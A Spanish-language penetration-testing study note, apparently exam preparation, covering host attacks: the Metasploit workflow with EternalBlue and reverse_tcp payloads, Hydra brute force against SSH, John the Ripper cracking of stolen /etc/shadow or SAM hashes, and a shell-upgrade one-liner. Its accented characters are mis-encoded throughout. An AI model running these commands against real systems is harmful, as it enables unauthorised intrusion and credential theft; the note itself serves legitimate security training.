# üñ•Ô∏è System/Host Based Attacks: El Asalto

## üëã Introducci√≥n

Ya hemos enumerado. Sabemos que hay un Windows 10 con SMB vulnerable o un Linux con un servidor web viejo.
Ahora toca la parte de la pel√≠cula: **Entrar**.

En este m√≥dulo aprendemos a usar nuestras armas principales: **Metasploit** (el lanzamisiles) y **Hydra/John** (los cerrajeros).

---

## üî´ Metasploit Framework (MSF): Tu Mejor Amigo

Metasploit no es solo una herramienta, es un ecosistema.
En el examen, vivir√°s dentro de `msfconsole`.

### La Rutina Sagrada de Metasploit
1.  **Search:** Busca el exploit.
    ```bash
    search eternalblue
    ```
2.  **Use:** Carga el m√≥dulo.
    ```bash
    use 0  # (O el n√∫mero que sea)
    ```
3.  **Configure:** Rellena los huecos.
    ```bash
    show options
    set RHOSTS 192.168.1.10  # Objetivo
    set LHOST 192.168.1.5    # T√∫ (Tu IP de la VPN)
    ```
4.  **Exploit:** ¬°Fuego!
    ```bash
    exploit
    ```

> [!TIP]
> **Payloads:** Por defecto Metasploit suele poner `windows/meterpreter/reverse_tcp`. A veces falla. Si no conecta, prueba con uno m√°s simple como `windows/shell/reverse_tcp`. Menos funcionalidades, pero m√°s estable.

---

## üîë Password Attacks: Cuando el Exploit Falla

A veces no hay vulnerabilidades m√°gicas (CVEs). A veces solo hay un puerto SSH abierto y un usuario llamado "admin".
Aqu√≠ entra la fuerza bruta.

### 1. Hydra (El Ametrallador Online)
Dispara contrase√±as contra un servicio en vivo (SSH, FTP, RDP).
```bash
# -l: usuario (login)
# -P: lista de contrase√±as (Password)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
```

### 2. John the Ripper (El Cirujano Offline)
Has robado un archivo de hashes (`/etc/shadow` o SAM). Ahora quieres romperlos en tu casa, sin hacer ruido en la red.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## ‚öîÔ∏è Windows vs Linux: Diferentes Bestias

### Windows
*   **El Rey:** SMB (EternalBlue). Si funciona, eres SYSTEM (Dios) al instante.
*   **El Pr√≠ncipe:** RDP (BlueKeep) o fuerza bruta.
*   **La Meta:** Queremos una shell `NT AUTHORITY\SYSTEM`.

### Linux
*   **El Rey:** Servicios Web vulnerables (WordPress, Apache Struts).
*   **El Pr√≠ncipe:** SSH con contrase√±as d√©biles.
*   **La Meta:** Queremos ser `root`. A menudo entraremos como `www-data` (usuario web) y tendremos que escalar privilegios.

---

## üìù Mis Notas Personales

```markdown
# Comandos √∫tiles
- Actualizar la shell en Linux: python3 -c 'import pty; pty.spawn("/bin/bash")'
- Payload favorito para Windows: ...
```

---
[‚¨ÖÔ∏è Volver a Host & Network Pentesting](../README.md) | [‚û°Ô∏è Siguiente: Network Based Attacks](../02-network-attacks/README.md)
